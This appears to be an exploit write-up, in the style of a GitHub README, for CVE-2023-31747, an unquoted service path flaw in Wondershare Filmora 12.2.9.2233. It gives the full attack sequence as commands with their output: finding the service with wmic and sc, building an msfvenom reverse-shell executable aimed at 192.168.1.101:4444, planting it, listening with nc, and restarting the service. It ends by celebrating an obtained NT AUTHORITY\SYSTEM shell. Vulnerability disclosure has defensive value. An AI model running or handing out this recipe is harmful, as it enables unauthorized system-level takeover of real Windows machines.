<a target="_blank" href="https://img.shields.io/badge/plateform-windows-blue.svg" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/plateform-windows-blue.svg">
</a>
<a target="_blank" href="https://img.shields.io/badge/version-12.2.9.2233-yellow" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/version-12.2.9.2233-yellow">
</a>
<a href="" rel="nofollow">
    <img src="https://img.shields.io/badge/unquoted_service_path-red">
</a>

```bash
############################################################################
#                                                                          #
#  Exploit Title: Wondershare Filmora 12.2.9.2233 - Unquoted Service Path  #
#  CVE-2023-31747                                                          #
#  Date: 2023/04/23                                                        #
#  Exploit Author: msd0pe                                                  #
#  Vendor Homepage: https://www.wondershare.com                            #
#  My Github: https://github.com/msd0pe-1                                  # 
#                                                                          # 
############################################################################
```

<h3>Wondershare Filmora:</h3>
Versions =< 12.2.9.2233 contains an unquoted service path which allows attackers to escalate privileges to the system level.

<h2>Find the unquoted service path:</h2>

```bash
    > wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

    Wondershare Native Push Service   NativePushService   C:\Users\msd0pe\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe   Auto
```

<h2>Get informations about the service:</h2>

```bash
    > sc qc "NativePushService"

    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: NativePushService
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Users\msd0pe\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Wondershare Native Push Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem
```

<h2>Generate a reverse shell:</h2>

```bash
    > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o Wondershare.exe
 ```

<h2>Upload the reverse shell to C:\Users\msd0pe\AppData\Local\Wondershare\Wondershare.exe</h2>

```bash
    > put Wondershare.exe
    > ls
    drw-rw-rw-          0  Sun Apr 23 14:51:47 2023 .
    drw-rw-rw-          0  Sun Apr 23 14:51:47 2023 ..
    drw-rw-rw-          0  Sun Apr 23 14:36:26 2023 Wondershare Filmora Update
    drw-rw-rw-          0  Sun Apr 23 14:37:13 2023 Wondershare NativePush
    -rw-rw-rw-       7168  Sun Apr 23 14:51:47 2023 Wondershare.exe
    drw-rw-rw-          0  Sun Apr 23 13:52:30 2023 WSHelper
```

<h2>Start listener</h2>

```bash
    > nc -lvp 4444
```

<h2>Reboot the service/server</h2>

```bash
    > sc stop "NativePushService"
    > sc start "NativePushService"
```

OR

```bash
    > shutdown /r
```

<h2>Enjoy !</h2>

```bash
    192.168.1.102: inverse host lookup failed: Unknown host
    connect to [192.168.1.101] from (UNKNOWN) [192.168.1.102] 51309
    Microsoft Windows [Version 10.0.19045.2130]
    (c) Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami

    nt authority\system
```
